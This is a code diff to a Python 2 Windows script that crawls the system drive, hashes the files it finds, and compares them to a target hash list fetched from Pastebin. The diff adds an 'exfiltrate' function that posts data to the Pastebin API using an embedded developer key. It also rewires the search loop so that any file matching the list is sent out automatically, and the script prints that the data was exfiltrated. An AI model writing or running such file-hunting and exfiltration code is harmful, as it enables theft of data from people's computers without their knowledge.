@@ -9,7 +9,7 @@ import hashlib
 import urllib2
 
 # config
-pastebinlink = 'http://pastebin.com/raw.php?i=b1Yz8vbD' #add your pastebin hash list url here
+pastebinlink = 'http://pastebin.com/raw.php?i=GQvqfhBG' #add your raw pastebin hash list url here
 
 
 # functions
@@ -25,6 +25,15 @@ def print_dog():
       (_)_)           (_)_)
 
 	"""
+
+def hashmesha256(hashme, hashalgo=hashlib.sha256(), blocksize=65536):
+	filetohash = open(hashme, 'rb') #binary
+	chunky = filetohash.read(blocksize)
+	while len(chunky) > 0:
+		hashalgo.update(chunky)
+		chunky = filetohash.read(blocksize)
+	return hashalgo.hexdigest()
+
 def get_pc_name():
 	return os.environ['COMPUTERNAME']
 
@@ -70,14 +79,6 @@ def hashme_md5_small_file(hashme):
 
 def hashme_sha256_small_file(hashme):
 	return hashlib.sha256(open(hashme, 'rb').read()).hexdigest()
-
-def hashmesha256(hashme, hashalgo=hashlib.sha256(), blocksize=65536):
-	filetohash = open(hashme, 'rb') #binary
-	chunky = filetohash.read(blocksize)
-	while len(chunky) > 0:
-		hashalgo.update(chunky)
-		chunky = filetohash.read(blocksize)
-	return hashalgo.hexdigest()
 
 def clear_junk_folders(allfolderlist,junklist):
 	return [z for z in allfolderlist if z not in junklist]
@@ -126,42 +127,25 @@ def gethashlistfromurl(pastebinlink):
 	urlhtml = urltoparse.read()
 	all_hashes_list = urlhtml.split()
 	urltoparse.close()
-	
 	return all_hashes_list
 
-####################################################
-# STUFF ABOVE HERE WORKS and below here is concept #
-####################################################
-
-def waiting():
-	print 'Loading....  ',
-	sys.stdout.flush()
-	i = 0
-	while i <= 16:
-		if (i%4) == 0: 
-			sys.stdout.write('\b/')
-		elif (i%4) == 1: 
-			sys.stdout.write('\b-')
-		elif (i%4) == 2:
-			sys.stdout.write('\b\\')
-		elif (i%4) == 3: 
-			sys.stdout.write('\b|')
-		sys.stdout.flush()
-		time.sleep(0.2)
-		i+=1
-	#print 'done!'
+def exfiltrate(exfil):
+	import urllib
+	pastebin_vars = {'api_dev_key':'57fe1369d02477a235057557cbeabaa1','api_option':'paste','api_paste_code':exfil,'api_paste_expire_date':'10M'}
+	response = urllib.urlopen('http://pastebin.com/api/api_post.php', urllib.urlencode(pastebin_vars))
+	url = response.read()
+	print '[x] data exfiltrated to pastebin url: ', url
 
 def urlhashes_vs_file(all_files_list,all_hashes_list):
 	for entry in all_files_list:
-		try:
-			filehash = hashlib.md5(open(entry, 'rb').read()).hexdigest()
-			if filehash in all_hashes_list:
-				print 'file: ', entry, 'md5: ', filehash, '+++ [target found] +++'
-				break
-			else:
-				print 'file: ', entry, 'md5: ', filehash	
-		except:
-			pass	
+		filehash = hashlib.md5(open(entry, 'rb').read()).hexdigest()
+		if filehash not in all_hashes_list:
+			print 'file: ', entry, 'md5: ', filehash
+		else:
+			print 'file: ', entry, 'md5: ', filehash, '+++ [target found] +++'
+			exfil = entry
+			exfiltrate(exfil)
+			break
 
 def checkforstring(all_files_list, whatchalookingfor):
 	hit_link_file = open('filelist.txt', 'w')
@@ -176,6 +160,7 @@ def checkforstring(all_files_list, whatchalookingfor):
 	hit_link_file.close()
 	return hit_link_file
 
+
 ###### Main Loop #######
 if __name__ == '__main__':
 
@@ -189,9 +174,9 @@ if __name__ == '__main__':
 		print '[v] win user folder: ', get_win_user_folder()
 		print ''
 		print '[...] getting info about folder structure... '
-		print '[v] all folders on system drive:\n', get_subdirectories_of('C://')
+		print '[v] all folders on system drive:\n', get_subdirectories_of(get_windows_drives()[0])
 		print '[v] junk folders to exclude from search: ', exculdethesefolders(get_system_drive())
-		boomerang = clear_junk_folders(get_subdirectories_of('C://'),exculdethesefolders(get_system_drive()))
+		boomerang = clear_junk_folders(get_subdirectories_of(get_windows_drives()[0]),exculdethesefolders(get_system_drive()))
 		print '[v] clean list of folders to scan: ', make_whole_path_of_dir(boomerang)
 		print ''
 		print '[...] making a list with all files in clean folders. this might take a while.'#, waiting()
@@ -204,6 +189,6 @@ if __name__ == '__main__':
 		print '[v] entries: ', all_hashes_list
 		print ''
 		print '[v] searching... ', urlhashes_vs_file(all_files_list,all_hashes_list)
-		print ''	
+		print ''
 		print 'done'
 		break
